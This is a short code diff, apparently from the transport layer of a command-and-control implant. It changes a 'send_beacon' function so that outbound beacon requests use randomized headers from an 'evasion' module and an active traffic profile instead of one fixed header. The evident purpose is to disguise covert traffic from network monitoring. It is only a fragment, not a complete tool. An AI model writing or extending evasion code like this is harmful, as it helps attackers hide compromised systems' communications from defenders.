@@ -5,6 +5,8 @@ import os
 from common import config
 from common.logger import get_logger
 from common.utils import TransportError
+from evasion.header_randomizer import get_headers
+from transport.traffic_profile import load_active_profile
 
 logger = get_logger('transport')
 
@@ -54,10 +56,13 @@ def send_beacon(endpoint: str, payload: bytes) -> bytes:
     session = _build_session()
 
     try:
+        profile  = load_active_profile()
+        headers  = get_headers(profile.header_level)
+
         response = session.post(
             endpoint,
             data    = payload,
-            headers = {'Content-Type': 'application/octet-stream'},
+            headers = headers,
             timeout = REQUEST_TIMEOUT_S,
         )
     except requests.exceptions.ConnectionError as e:
